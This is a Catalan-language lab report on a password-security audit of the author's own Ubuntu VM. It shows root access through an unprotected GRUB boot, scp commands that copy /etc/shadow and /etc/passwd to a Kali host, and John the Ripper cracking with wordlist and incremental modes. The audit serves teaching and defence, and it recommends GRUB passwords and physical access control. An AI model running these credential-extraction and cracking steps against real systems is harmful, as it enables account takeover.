# Informe d'Auditoria de Seguretat — Cracking de Contrasenyes en Linux

## 1. Objectiu

Auditar la seguretat de les contrasenyes dels usuaris d'una màquina virtual Ubuntu Server, simulant un atac en dues fases:

1. Aconseguir accés com a `root` a la màquina víctima per extreure els arxius `/etc/passwd` i `/etc/shadow`.
2. Crackejar les contrasenyes usant **John the Ripper** (`Johnny`) des de Kali Linux.

---

## 2. Configuració de l'escenari

- Màquina víctima: Ubuntu Server (OVA importada), interfície de xarxa en mode **NAT**.
- Màquina atacant: Kali Linux 2, interfície de xarxa també en mode **NAT**, a la mateixa subxarxa que la víctima.

![Cap1](/Img/1.png)

![Cap2](/Img/2.png)
---

## 3. Fase 1 — Accés com a root a la màquina víctima

Vaig reiniciar la màquina Ubuntu Server i vaig accedir com a `root` aprofitant l'absència de protecció a l'arrencada de GRUB (edició de paràmetres d'arrencada per obtenir una shell amb privilegis).

![Cap3](/Img/3.png)

### 3.1 Exfiltració d'arxius

Com que es tracta d'un servidor accessible per SSH, es va fer servir `scp` per transferir els arxius crítics a la màquina Kali:

```bash
scp /etc/shadow kali@10.2.0.15:.
scp /etc/passwd kali@10.2.0.15:.
```
![Cap4](/Img/4.png)
![Cap5](/Img/5.png)

> ⚠️ En accedir com a root es té control total de la màquina. Això demostra que protegir només amb contrasenya d'usuari no n'hi ha prou; calen capes addicionals:
> - Control d'accés físic a la màquina.
> - Contrasenya al GRUB per evitar aquest tipus d'atac.

---

## 4. Fase 2 — Cracking de contrasenyes amb John the Ripper

### 4.1 Descompressió del diccionari RockYou

El diccionari `rockyou.txt` ve integrat per defecte a Kali, però es troba comprimit en format `.gz` per estalviar espai. Cal descomprimir-lo abans del primer ús:

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

![Cap6](/Img/6.png)

### 4.2 Creació de l'arxiu d'usuaris/hashes (unshadow)

Es combinen `passwd` i `shadow` en un únic arxiu amb el format que espera John:

![Cap7](/Img/7.png)
![Cap8](/Img/8.png)

```bash
sudo unshadow passwd shadow > passwords-noah.txt
```
![Cap9](/Img/9.png)


### 4.3 Especificar l'algorisme de hash (opcional)

John detecta l'algorisme automàticament analitzant la capçalera del hash (`$6$` SHA-512, `$1$` MD5, `$y$` yescrypt, etc.), però especificar-ho amb `--format` redueix el temps de processament quan es coneix d'entrada:

```bash
john --format=sha512crypt passwords-noah.txt
```

### 4.4 Atac "Single Crack"

Primera fase recomanada en qualsevol auditoria. No fa servir cap diccionari extern: agafa el nom d'usuari i la informació associada a `/etc/passwd` (nom complet, directori home) i hi aplica regles de permutació (majúscules/minúscules, addició de números, inversió de caràcters...). És molt ràpid i efectiu per detectar negligències bàsiques.

```bash
john --format=sha512crypt passwords-noah.txt
john --format=crypt passwords-noah.txt
```
![Cap10](/Img/10.png)
![Cap11](/Img/11.png)

### 4.5 Atac de diccionari

Amb el diccionari descomprimit, s'executa l'atac indicant-ne la ruta:

```bash
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt passwords-noah.txt
```

![Cap12](/Img/12.png)

### 4.6 Atac incremental numèric (màscara 4-8 dígits)

Per avaluar la resistència davant de contrasenyes tipus PIN o patrons numèrics (dates, codis), es limita l'espai de cerca a dígits (0-9) amb longitud mínima i màxima. Prova sistemàticament totes les combinacions des de `0000` fins a `99999999`:
No vaig trobar res.

```bash
john --incremental=Digits --min-len=4 --max-len=8 passwords-noah.txt
```

![Cap13](/Img/13.png)

---

## Veure les contrasenyes crackejades

Les contrasenyes trobades es guarden a `~/.john/john.pot`. Per mostrar-les associades a cada usuari:

```bash
john --show passwords.noah.txt
```

![Cap14](/Img/14.png)

---
